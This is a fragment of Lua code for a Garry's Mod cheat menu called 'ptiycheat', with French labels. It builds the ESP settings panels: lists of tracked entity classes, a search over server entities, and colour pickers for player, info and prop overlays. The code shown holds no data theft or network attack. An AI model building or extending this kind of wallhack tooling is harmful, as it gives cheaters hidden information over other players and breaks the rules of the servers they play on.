LocalPlayer():ConCommand("fiji_clearespent")
surface.PlaySound( fiji_ptiycheatclick )
chat.AddText(Color(0, 0, 0), "[", "ptiycheat", "] ", Color( 89, 255, 105 ), "Entitées sauvegarder" )
end
end

    --[[-------------------------------------------------------------------------
        Added
    ---------------------------------------------------------------------------]]

    local added = vgui.Create( "DPanel", Base )
    added:SetSize( 200, 200 )
    added:SetPos( 255, 35 )
    function added:Paint( intW, intH )
        surface.SetDrawColor(75, 75, 75, 50 )
        surface.DrawRect( 0, 0, intW, 25 )

        draw.SimpleText( "Entités ajoutées", "Trebuchet18", intW / 2, 25 / 2, color_white, 1, 1 )
    end

    local aScroll = vgui.Create( "DScrollPanel", added )
    aScroll:SetSize( added:GetWide(), added:GetTall() - 25 )
    aScroll:SetPos( 0, 25 )
    aScroll.VBar:SetHideButtons( true )
    local scroll = aScroll.VBar
    function scroll:Paint( intW, intH )
         surface.SetDrawColor( 75, 75, 75, 80)
        surface.DrawRect( 0, 0, intW, intH )
    end
    function scroll.btnGrip:Paint( intW, intH )
        surface.SetDrawColor( 255, 255, 255, 10 )
        surface.DrawRect( 0, 0, intW, intH )
    end

    local function makeList()
        aScroll:Clear()

        local esp = GetESP()

        local intItem = 0

        for k, v in pairs( esp ) do
            local item = vgui.Create( "DPanel", aScroll )
            item:SetSize( aScroll:GetWide(), 25 )
            item:SetPos( 0, intItem * 25 )
            function item:Paint( intW, intH )
                surface.SetDrawColor( 75, 75, 75, 50 )
                surface.DrawRect( 0, 0, intW, intH )

                draw.SimpleText( k, "Trebuchet18", 30, intH / 2, v.color, 0, 1 )
            end

            local remove = vgui.Create( "DImageButton", item )
            remove:SetSize( 10, 10 )
            remove:SetPos( 5, item:GetTall() / 2 - remove:GetTall() / 2+3 )
            remove:SetImage( "icon16/cross.png" )
            remove:SetTooltip( "Supprimer" )
            function remove:DoClick()
                RemoveFromESP( k )
                makeList()
            end

            intItem = intItem + 1
        end
    end
    makeList()


    --[[-------------------------------------------------------------------------
        Add
    ---------------------------------------------------------------------------]]

    local addPanel = vgui.Create( "DPanel", Base )
    addPanel:SetSize( 215, 55 )
    addPanel:SetPos( 10, 35 )
    addPanel:SetBackgroundColor( Color( 50, 50, 50 ) )

    local class = vgui.Create( "DTextEntry", addPanel )
    class:SetSize( addPanel:GetWide() - 75, 30 )
    class:SetPlaceholderText( "Classe" )

    local colors = vgui.Create( "DPanel", addPanel )
    colors:SetSize( addPanel:GetWide(), 25 )
    colors:SetPos( 0, 30 )
    function colors:Paint() end

    local activeColor = 1

    for i = 1, #tblColors do
        local color = vgui.Create( "DButton", colors )
        color:SetSize( 16, 16 )
        color:SetPos( 5 + ( ( i - 1 ) * 21 ), 5 )
        color:SetText("")
        function color:Paint( intW, intH )
            surface.SetDrawColor( tblColors[i].color )
            surface.DrawRect( 0, 0, intW, intH )

            if activeColor == i then
                surface.SetDrawColor( color_white )
                surface.DrawOutlinedRect( 0, 0, intW, intH )
                surface.SetDrawColor( color_black )
                surface.DrawOutlinedRect( 1, 1, intW - 2, intH - 2 )
            end
        end
        function color:DoClick()
            activeColor = i
        end
    end

    local add = vgui.Create( "DButton", addPanel )
    add:SetSize( addPanel:GetWide() - class:GetWide(), 30 )
    add:SetPos( class:GetWide(), 0 )
    add:SetText( "Ajouter" )
   function add:OnCursorEntered() self.IsHovered = true end
function add:OnCursorExited() self.IsHovered = false end
function add:Paint( w, h )

if self.IsHovered then
draw.RoundedBox( 0, 0, 0, w, h, Color( 75, 75, 75, 100 ) )
cBorder = Color( 110,110,110, 30 )
add:SetTextColor( Color( 255, 255, 255, 255 ) )
else
draw.RoundedBox( 0, 0, 0, w, h, Color( 75, 75, 75, 50 ) )
cBorder = Color( 110,110,110, 0 )
add:SetTextColor( Color( 255, 255, 255, 150 ) )
end


surface.SetDrawColor( cBorder )
surface.DrawOutlinedRect( 0, 0, w, h )
end
    function add:DoClick()
        AddToESP( class:GetText() or "null", tblColors[activeColor] or color_whie )
        makeList()
    end

    --[[-------------------------------------------------------------------------
        List srv
    ---------------------------------------------------------------------------]]

    local srvPanelList = vgui.Create( "DPanel", Base )
    srvPanelList:SetSize( 200, 200 )
    srvPanelList:SetPos( Base:GetWide() - srvPanelList:GetWide() - 10, 35 )
    function srvPanelList:Paint( intW, intH )
        surface.SetDrawColor( 75, 75, 75, 50 )
        surface.DrawRect( 0, 0, intW, 25 )

        draw.SimpleText( "Entités du serveur", "Trebuchet18", intW / 2, 25 / 2, color_white, 1, 1 )
    end

    local srvScroll = vgui.Create( "DScrollPanel", srvPanelList )
    srvScroll:SetSize( srvPanelList:GetWide(), srvPanelList:GetTall() - 50 )
    srvScroll:SetPos( 0, 50 )
    srvScroll.VBar:SetHideButtons( true )
    local scroll = srvScroll.VBar
    function scroll:Paint( intW, intH )
        surface.SetDrawColor( 75, 75, 75, 80)

        surface.DrawRect( 0, 0, intW, intH )
    end
    function scroll.btnGrip:Paint( intW, intH )

        surface.SetDrawColor( 255, 255, 255, 10 )
                surface.DrawRect( 0, 0, intW, intH )
    end

    local srvList = vgui.Create( "DIconLayout", srvScroll )
    srvList:SetSize( srvScroll:GetWide(), srvScroll:GetTall() )

    local srv = scripted_ents.GetList()
    table.sort( srv, function( a, b ) return a.t.ClassName > b.t.ClassName  end )
    local getEsp = GetESP()

    local intItem = 0

    local tblUsed = {}
    local tblESp = GetESP()

    for k, v in pairs( srv ) do
        if tblESp[ v.t.ClassName ] != nil then continue end
        if blackListESP[v.t.ClassName] then continue end

        if tblUsed[v.t.ClassName] then continue end
        tblUsed[v.t.ClassName] = true

        local item = srvList:Add( "DPanel" )
        item:SetSize( srvScroll:GetWide(), 25 )
        item:SetPos( 0, intItem * 25 )
        item.class = v.t.ClassName
        function item:Paint( intW, intH )
            surface.SetDrawColor( 75, 75, 75, 50 )
            surface.DrawRect( 0, 0, intW, intH )

            draw.SimpleText( v.t.ClassName, "Trebuchet18", 30, intH / 2, color_white, 0, 1 )
        end

        local remove = vgui.Create( "DImageButton", item )
        remove:SetSize( 13, 13 )
        remove:SetPos( 5, item:GetTall() / 2 - remove:GetTall() / 2 +2)
        remove:SetImage( "icon16/add.png" )
        remove:SetTooltip( "Ajouter" )
        function remove:DoClick()
            class:SetText( v.t.ClassName )
            makeList()
        end

        intItem = intItem + 1
    end

    local search = vgui.Create( "DTextEntry", srvPanelList )
    search:SetSize( srvPanelList:GetWide(), 25 )
    search:SetPos( 0, 25 )
    function search:OnChange()
        for k, v in pairs( srvList:GetChildren() ) do
            print( v.class )
            if string.find( v.class, self:GetText() ) then
                v:SetVisible( true )
            else
                v:SetVisible( false )
            end
            srvList:Layout()
        end
    end

end)

function BD:Esp( pContent )

local BDMenuEsp = vgui.Create("DPanel", pContent)
BDMenuEsp:SetSize( 539, 388 )
BDMenuEsp:SetPos( 0, 0 )
BDMenuEsp.Paint = function( self, w, h)
draw.RoundedBox( 0, 0, 0, w, h, Color(255,35,35,0 ) )

if fiji_style_menu:GetInt() == 2 then
draw.RoundedBox( 0, 0, 146, 2, h - 120, Color(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75)) )
draw.RoundedBox( 0, 0, 0, 2, h - 286, Color(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75)) )

elseif fiji_style_menu:GetInt() == 1 then
draw.RoundedBox( 0, 0, 146, 2, h - 120, HSVToColor( CurTime() % 6 * 60, 1, 0.5 ) )
draw.RoundedBox( 0, 0, 0, 2, h - 286, HSVToColor( CurTime() % 6 * 60, 1, 0.5 ) )

else
draw.RoundedBox( 0, 0, 146, 2, h - 120, Color( fiji_menu_princ_color:GetInt(),fiji_menu_sec_color:GetInt(),fiji_menu_th_color:GetInt(), 255 ) )
draw.RoundedBox( 0, 0, 0, 2, h - 286, Color( fiji_menu_princ_color:GetInt(),fiji_menu_sec_color:GetInt(),fiji_menu_th_color:GetInt(), 255 ) )
end


draw.RoundedBox( 200, 20, 10, 2, h - 20, Color( 50,50,50, 255 ) )
draw.RoundedBox( 200, 250, 10, 2, h - 20, Color( 50,50,50, 255 ) )
draw.RoundedBox( 0, 20, 378, w - 307, 2, Color( 50,50,50, 255 ) )
draw.RoundedBox( 0, 20, 10, w - 463, 2, Color( 50,50,50, 255 ) )
draw.RoundedBox( 0, 175, 10, w - 463, 2, Color( 50,50,50, 255 ) )
draw.SimpleText("Esp Joueurs", "ptiycheat_home3", 100, 10, Color(100, 100, 100,255), 0, 1)

draw.RoundedBox( 200, 515, 10, 2, h - 216, Color( 50,50,50, 255 ) )
draw.RoundedBox( 200, 282, 10, 2, h - 216, Color( 50,50,50, 255 ) )
draw.RoundedBox( 0, 284, 180, w - 307, 2, Color( 50,50,50, 255 ) )
draw.RoundedBox( 0, 284, 10, w - 463, 2, Color( 50,50,50, 255 ) )
draw.RoundedBox( 0, 440, 10, w - 463, 2, Color( 50,50,50, 255 ) )
draw.SimpleText("Esp Entitées", "ptiycheat_home3", 365, 10, Color(100, 100, 100,255), 0, 1)

draw.RoundedBox( 200, 515, 205, 2, h - 213, Color( 50,50,50, 255 ) )
draw.RoundedBox( 200, 282, 205, 2, h - 213, Color( 50,50,50, 255 ) )
draw.RoundedBox( 0, 284, 378, w - 307, 2, Color( 50,50,50, 255 ) )
draw.RoundedBox( 0, 284, 205, w - 455, 2, Color( 50,50,50, 255 ) )
draw.RoundedBox( 0, 433, 205, w - 455, 2, Color( 50,50,50, 255 ) )
draw.SimpleText("Esp Props", "ptiycheat_home3", 372.5, 205, Color(100, 100, 100,255), 0, 1)
end
local intW = 125
local intY = pContent:GetTall() / 2 - intW / 2


local pPcolor = vgui.Create( "DPanel", pContent )
pPcolor:SetSize( 205, 50 )
pPcolor:SetPos( 33, 243 )
function pPcolor:Paint( w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color( 110,110,110, 20 ) )
draw.SimpleText( "Couleur ESP", "ptiycheat_home5", 72, 8, color_white, 0, 1 )
end
local OptionsColorRed = vgui.Create( "DButton", pPcolor )
OptionsColorRed:SetPos( 4,20 )
OptionsColorRed:SetSize( 20, 20 )
OptionsColorRed:SetText( " " )
OptionsColorRed.Paint = function( self, w, h )
if self:IsHovered() then
draw.RoundedBox(0,0,0,w,h,Color(183, 0, 0))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
else
draw.RoundedBox( 0, 0, 0, w, h, Color(255, 81, 81))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
end
OptionsColorRed.DoClick = function()
LocalPlayer():ConCommand("fiji_principal_color 255")
LocalPlayer():ConCommand("fiji_secondary_color 0")
LocalPlayer():ConCommand("fiji_third_color 0")
surface.PlaySound( fiji_ptiycheathover )

end
end
local OptionsColorOrange = vgui.Create( "DButton", pPcolor )
OptionsColorOrange:SetPos( 26,20 )
OptionsColorOrange:SetSize( 20, 20 )
OptionsColorOrange:SetText( " " )
OptionsColorOrange.Paint = function( self, w, h )
if self:IsHovered() then
draw.RoundedBox(0,0,0,w,h,Color(211, 116, 0))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
else
draw.RoundedBox( 0, 0, 0, w, h, Color(255, 165, 56))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
end
OptionsColorOrange.DoClick = function()
LocalPlayer():ConCommand("fiji_principal_color 255")
LocalPlayer():ConCommand("fiji_secondary_color 102")
LocalPlayer():ConCommand("fiji_third_color 0")
surface.PlaySound( fiji_ptiycheathover )

end
end
local OptionsColorYellow = vgui.Create( "DButton", pPcolor )
OptionsColorYellow:SetPos( 48,20 )
OptionsColorYellow:SetSize( 20, 20 )
OptionsColorYellow:SetText( " " )
OptionsColorYellow.Paint = function( self, w, h )
if self:IsHovered() then
draw.RoundedBox(0,0,0,w,h,Color(193, 190, 0))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
else
draw.RoundedBox( 0, 0, 0, w, h, Color(255, 253, 160))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
end
OptionsColorYellow.DoClick = function()
LocalPlayer():ConCommand("fiji_principal_color 196")
LocalPlayer():ConCommand("fiji_secondary_color 192")
LocalPlayer():ConCommand("fiji_third_color 0")
surface.PlaySound( fiji_ptiycheathover )

end
end
local OptionsColorGreen = vgui.Create( "DButton", pPcolor )
OptionsColorGreen:SetPos( 70,20 )
OptionsColorGreen:SetSize( 20, 20 )
OptionsColorGreen:SetText( " " )
OptionsColorGreen.Paint = function( self, w, h )
if self:IsHovered() then
draw.RoundedBox(0,0,0,w,h,Color(2, 178, 0))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
else
draw.RoundedBox( 0, 0, 0, w, h, Color(119, 255, 117))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
end
OptionsColorGreen.DoClick = function()
LocalPlayer():ConCommand("fiji_principal_color 0")
LocalPlayer():ConCommand("fiji_secondary_color 255")
LocalPlayer():ConCommand("fiji_third_color 0")
surface.PlaySound( fiji_ptiycheathover )

end
end
local OptionsColorBlue = vgui.Create( "DButton", pPcolor )
OptionsColorBlue:SetPos( 92,20 )
OptionsColorBlue:SetSize( 20, 20 )
OptionsColorBlue:SetText( " " )
OptionsColorBlue.Paint = function( self, w, h )
if self:IsHovered() then
draw.RoundedBox(0,0,0,w,h,Color(0, 0, 255))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
else
draw.RoundedBox( 0, 0, 0, w, h, Color(117, 121, 255))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
end
OptionsColorBlue.DoClick = function()
LocalPlayer():ConCommand("fiji_principal_color 0")
LocalPlayer():ConCommand("fiji_secondary_color 0")
LocalPlayer():ConCommand("fiji_third_color 255")
surface.PlaySound( fiji_ptiycheathover )

end
end
local OptionsColorSeaBlue = vgui.Create( "DButton", pPcolor )
OptionsColorSeaBlue:SetPos( 114,20 )
OptionsColorSeaBlue:SetSize( 20, 20 )
OptionsColorSeaBlue:SetText( " " )
OptionsColorSeaBlue.Paint = function( self, w, h )
if self:IsHovered() then
draw.RoundedBox(0,0,0,w,h,Color(0, 221, 210))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
else
draw.RoundedBox( 0, 0, 0, w, h, Color(81, 255, 246))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
end
OptionsColorSeaBlue.DoClick = function()
LocalPlayer():ConCommand("fiji_principal_color 0")
LocalPlayer():ConCommand("fiji_secondary_color 229")
LocalPlayer():ConCommand("fiji_third_color 255")
surface.PlaySound( fiji_ptiycheathover )

end
end
local OptionsColorPurple = vgui.Create( "DButton", pPcolor )
OptionsColorPurple:SetPos( 136,20 )
OptionsColorPurple:SetSize( 20, 20 )
OptionsColorPurple:SetText( " " )
OptionsColorPurple.Paint = function( self, w, h )
if self:IsHovered() then
draw.RoundedBox(0,0,0,w,h,Color(144, 0, 255))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
else
draw.RoundedBox( 0, 0, 0, w, h, Color(191, 109, 255))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
end
OptionsColorPurple.DoClick = function()
LocalPlayer():ConCommand("fiji_principal_color 89")
LocalPlayer():ConCommand("fiji_secondary_color 0")
LocalPlayer():ConCommand("fiji_third_color 255")
surface.PlaySound( fiji_ptiycheathover )

end
end
local OptionsColorPink = vgui.Create( "DButton", pPcolor )
OptionsColorPink:SetPos( 158,20 )
OptionsColorPink:SetSize( 20, 20 )
OptionsColorPink:SetText( " " )
OptionsColorPink.Paint = function( self, w, h )
if self:IsHovered() then
draw.RoundedBox(0,0,0,w,h,Color(250, 0, 255))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
else
draw.RoundedBox( 0, 0, 0, w, h, Color(252, 96, 255))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
end
OptionsColorPink.DoClick = function()
LocalPlayer():ConCommand("fiji_principal_color 255")
LocalPlayer():ConCommand("fiji_secondary_color 0")
LocalPlayer():ConCommand("fiji_third_color 250")
surface.PlaySound( fiji_ptiycheathover )

end
end
local OptionsColorWhite = vgui.Create( "DButton", pPcolor )
OptionsColorWhite:SetPos( 180,20 )
OptionsColorWhite:SetSize( 20, 20 )
OptionsColorWhite:SetText( " " )
OptionsColorWhite.Paint = function( self, w, h )
if self:IsHovered() then
draw.RoundedBox(0,0,0,w,h,Color(210, 210, 210))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
else
draw.RoundedBox( 0, 0, 0, w, h, Color(255, 255, 255))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
end
OptionsColorWhite.DoClick = function()
LocalPlayer():ConCommand("fiji_principal_color 255")
LocalPlayer():ConCommand("fiji_secondary_color 255")
LocalPlayer():ConCommand("fiji_third_color 255")
surface.PlaySound( fiji_ptiycheathover )

end
end
--[[if fiji_vision_type:GetInt() == 2 then
local pPcolornot = vgui.Create( "DPanel", pContent )
pPcolornot:SetSize( 238, 50 )
pPcolornot:SetPos( 151, 230 )
function pPcolornot:Paint( w, h )
DrawBlur(self, 5)
surface.SetDrawColor( 200,200,200,255 )
surface.DrawOutlinedRect( 0, 0, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color( 40,40,40, 180 ) )
draw.SimpleText( "SOLID : Configuration non-disponnible", "ptiycheat_home5", 11, 25, color_white, 0, 1 )
end
end]]
local pPcolor2 = vgui.Create( "DPanel", pContent )
pPcolor2:SetSize( 205, 50 )
pPcolor2:SetPos( 33, 298 )
function pPcolor2:Paint( w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color( 110,110,110, 20 ) )
draw.SimpleText( "Couleur Infos", "ptiycheat_home5", 70, 8, color_white, 0, 1 )
end
local OptionsColorRed2 = vgui.Create( "DButton", pPcolor2 )
OptionsColorRed2:SetPos( 4,20 )
OptionsColorRed2:SetSize( 20, 20 )
OptionsColorRed2:SetText( " " )
OptionsColorRed2.Paint = function( self, w, h )
if self:IsHovered() then
draw.RoundedBox(0,0,0,w,h,Color(183, 0, 0))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
else
draw.RoundedBox( 0, 0, 0, w, h, Color(255, 81, 81))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
end
OptionsColorRed2.DoClick = function()
LocalPlayer():ConCommand("fiji_principal_color_infos 255")
LocalPlayer():ConCommand("fiji_secondary_color_infos 50")
LocalPlayer():ConCommand("fiji_third_color_infos 50")
surface.PlaySound( fiji_ptiycheathover )

end
end
local OptionsColorOrange2 = vgui.Create( "DButton", pPcolor2 )
OptionsColorOrange2:SetPos( 26,20 )
OptionsColorOrange2:SetSize( 20, 20 )
OptionsColorOrange2:SetText( " " )
OptionsColorOrange2.Paint = function( self, w, h )
if self:IsHovered() then
draw.RoundedBox(0,0,0,w,h,Color(211, 116, 0))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
else
draw.RoundedBox( 0, 0, 0, w, h, Color(255, 165, 56))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
end
OptionsColorOrange2.DoClick = function()
LocalPlayer():ConCommand("fiji_principal_color_infos 255")
LocalPlayer():ConCommand("fiji_secondary_color_infos 165")
LocalPlayer():ConCommand("fiji_third_color_infos 56")
surface.PlaySound( fiji_ptiycheathover )

end
end
local OptionsColorYellow2 = vgui.Create( "DButton", pPcolor2 )
OptionsColorYellow2:SetPos( 48,20 )
OptionsColorYellow2:SetSize( 20, 20 )
OptionsColorYellow2:SetText( " " )
OptionsColorYellow2.Paint = function( self, w, h )
if self:IsHovered() then
draw.RoundedBox(0,0,0,w,h,Color(193, 190, 0))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
else
draw.RoundedBox( 0, 0, 0, w, h, Color(255, 253, 160))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
end
OptionsColorYellow2.DoClick = function()
LocalPlayer():ConCommand("fiji_principal_color_infos 196")
LocalPlayer():ConCommand("fiji_secondary_color_infos 192")
LocalPlayer():ConCommand("fiji_third_color_infos 0")
surface.PlaySound( fiji_ptiycheathover )

end
end
local OptionsColorGreen2 = vgui.Create( "DButton", pPcolor2 )
OptionsColorGreen2:SetPos( 70,20 )
OptionsColorGreen2:SetSize( 20, 20 )
OptionsColorGreen2:SetText( " " )
OptionsColorGreen2.Paint = function( self, w, h )
if self:IsHovered() then
draw.RoundedBox(0,0,0,w,h,Color(2, 178, 0))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
else
draw.RoundedBox( 0, 0, 0, w, h, Color(119, 255, 117))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
end
OptionsColorGreen2.DoClick = function()
LocalPlayer():ConCommand("fiji_principal_color_infos 3")
LocalPlayer():ConCommand("fiji_secondary_color_infos 196")
LocalPlayer():ConCommand("fiji_third_color_infos 0")
surface.PlaySound( fiji_ptiycheathover )

end
end
local OptionsColorBlue2 = vgui.Create( "DButton", pPcolor2 )
OptionsColorBlue2:SetPos( 92,20 )
OptionsColorBlue2:SetSize( 20, 20 )
OptionsColorBlue2:SetText( " " )
OptionsColorBlue2.Paint = function( self, w, h )
if self:IsHovered() then
draw.RoundedBox(0,0,0,w,h,Color(0, 0, 255))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
else
draw.RoundedBox( 0, 0, 0, w, h, Color(117, 121, 255))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
end
OptionsColorBlue2.DoClick = function()
LocalPlayer():ConCommand("fiji_principal_color_infos 91")
LocalPlayer():ConCommand("fiji_secondary_color_infos 96")
LocalPlayer():ConCommand("fiji_third_color_infos 255")
surface.PlaySound( fiji_ptiycheathover )

end
end
local OptionsColorSeaBlue2 = vgui.Create( "DButton", pPcolor2 )
OptionsColorSeaBlue2:SetPos( 114,20 )
OptionsColorSeaBlue2:SetSize( 20, 20 )
OptionsColorSeaBlue2:SetText( " " )
OptionsColorSeaBlue2.Paint = function( self, w, h )
if self:IsHovered() then
draw.RoundedBox(0,0,0,w,h,Color(0, 221, 210))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
else
draw.RoundedBox( 0, 0, 0, w, h, Color(81, 255, 246))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
end
OptionsColorSeaBlue2.DoClick = function()
LocalPlayer():ConCommand("fiji_principal_color_infos 81")
LocalPlayer():ConCommand("fiji_secondary_color_infos 255")
LocalPlayer():ConCommand("fiji_third_color_infos 246")
surface.PlaySound( fiji_ptiycheathover )

end
end
local OptionsColorPurple2 = vgui.Create( "DButton", pPcolor2 )
OptionsColorPurple2:SetPos( 136,20 )
OptionsColorPurple2:SetSize( 20, 20 )
OptionsColorPurple2:SetText( " " )
OptionsColorPurple2.Paint = function( self, w, h )
if self:IsHovered() then
draw.RoundedBox(0,0,0,w,h,Color(144, 0, 255))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
else
draw.RoundedBox( 0, 0, 0, w, h, Color(191, 109, 255))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
end
OptionsColorPurple2.DoClick = function()
LocalPlayer():ConCommand("fiji_principal_color_infos 147")
LocalPlayer():ConCommand("fiji_secondary_color_infos 76")
LocalPlayer():ConCommand("fiji_third_color_infos 255")
surface.PlaySound( fiji_ptiycheathover )

end
end
local OptionsColorPink2 = vgui.Create( "DButton", pPcolor2 )
OptionsColorPink2:SetPos( 158,20 )
OptionsColorPink2:SetSize( 20, 20 )
OptionsColorPink2:SetText( " " )
OptionsColorPink2.Paint = function( self, w, h )
if self:IsHovered() then
draw.RoundedBox(0,0,0,w,h,Color(250, 0, 255))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
else
draw.RoundedBox( 0, 0, 0, w, h, Color(252, 96, 255))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
end
OptionsColorPink2.DoClick = function()
LocalPlayer():ConCommand("fiji_principal_color_infos 252")
LocalPlayer():ConCommand("fiji_secondary_color_infos 96")
LocalPlayer():ConCommand("fiji_third_color_infos 255")
surface.PlaySound( fiji_ptiycheathover )

end
end
local OptionsColorWhite2 = vgui.Create( "DButton", pPcolor2 )
OptionsColorWhite2:SetPos( 180,20 )
OptionsColorWhite2:SetSize( 20, 20 )
OptionsColorWhite2:SetText( " " )
OptionsColorWhite2.Paint = function( self, w, h )
if self:IsHovered() then
draw.RoundedBox(0,0,0,w,h,Color(210, 210, 210))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
else
draw.RoundedBox( 0, 0, 0, w, h, Color(255, 255, 255))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
end
OptionsColorWhite2.DoClick = function()
LocalPlayer():ConCommand("fiji_principal_color_infos 255")
LocalPlayer():ConCommand("fiji_secondary_color_infos 255")
LocalPlayer():ConCommand("fiji_third_color_infos 255")
surface.PlaySound( fiji_ptiycheathover )

end
end


local pPcolor4 = vgui.Create( "DPanel", pContent )
pPcolor4:SetSize( 205, 50 )
pPcolor4:SetPos( 297, 316 )
function pPcolor4:Paint( w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color( 110,110,110, 20 ) )
draw.SimpleText( "Couleur Props", "ptiycheat_home5", 70, 8, color_white, 0, 1 )
end
local OptionsColorRed3 = vgui.Create( "DButton", pPcolor4 )
OptionsColorRed3:SetPos( 4,20 )
OptionsColorRed3:SetSize( 20, 20 )
OptionsColorRed3:SetText( " " )
OptionsColorRed3.Paint = function( self, w, h )
if self:IsHovered() then
draw.RoundedBox(0,0,0,w,h,Color(183, 0, 0))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
else
draw.RoundedBox( 0, 0, 0, w, h, Color(255, 81, 81))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
end
OptionsColorRed3.DoClick = function()
LocalPlayer():ConCommand("fiji_principal_color_props 255")
LocalPlayer():ConCommand("fiji_secondary_color_props 50")
LocalPlayer():ConCommand("fiji_third_color_props 50")
surface.PlaySound( fiji_ptiycheathover )

end
end
local OptionsColorOrange3 = vgui.Create( "DButton", pPcolor4 )
OptionsColorOrange3:SetPos( 26,20 )
OptionsColorOrange3:SetSize( 20, 20 )
OptionsColorOrange3:SetText( " " )
OptionsColorOrange3.Paint = function( self, w, h )
if self:IsHovered() then
draw.RoundedBox(0,0,0,w,h,Color(211, 116, 0))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
else
draw.RoundedBox( 0, 0, 0, w, h, Color(255, 165, 56))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
end
OptionsColorOrange3.DoClick = function()
LocalPlayer():ConCommand("fiji_principal_color_props 255")
LocalPlayer():ConCommand("fiji_secondary_color_props 165")
LocalPlayer():ConCommand("fiji_third_color_props 56")
surface.PlaySound( fiji_ptiycheathover )

end
end
local OptionsColorYellow3 = vgui.Create( "DButton", pPcolor4 )
OptionsColorYellow3:SetPos( 48,20 )
OptionsColorYellow3:SetSize( 20, 20 )
OptionsColorYellow3:SetText( " " )
OptionsColorYellow3.Paint = function( self, w, h )
if self:IsHovered() then
draw.RoundedBox(0,0,0,w,h,Color(193, 190, 0))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
else
draw.RoundedBox( 0, 0, 0, w, h, Color(255, 253, 160))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
end
OptionsColorYellow3.DoClick = function()
LocalPlayer():ConCommand("fiji_principal_color_props 196")
LocalPlayer():ConCommand("fiji_secondary_color_props 192")
LocalPlayer():ConCommand("fiji_third_color_props 0")
surface.PlaySound( fiji_ptiycheathover )

end
end
local OptionsColorGreen3 = vgui.Create( "DButton", pPcolor4 )
OptionsColorGreen3:SetPos( 70,20 )
OptionsColorGreen3:SetSize( 20, 20 )
OptionsColorGreen3:SetText( " " )
OptionsColorGreen3.Paint = function( self, w, h )
if self:IsHovered() then
draw.RoundedBox(0,0,0,w,h,Color(2, 178, 0))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
else
draw.RoundedBox( 0, 0, 0, w, h, Color(119, 255, 117))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
end
OptionsColorGreen3.DoClick = function()
LocalPlayer():ConCommand("fiji_principal_color_props 3")
LocalPlayer():ConCommand("fiji_secondary_color_props 196")
LocalPlayer():ConCommand("fiji_third_color_props 0")
surface.PlaySound( fiji_ptiycheathover )

end
end
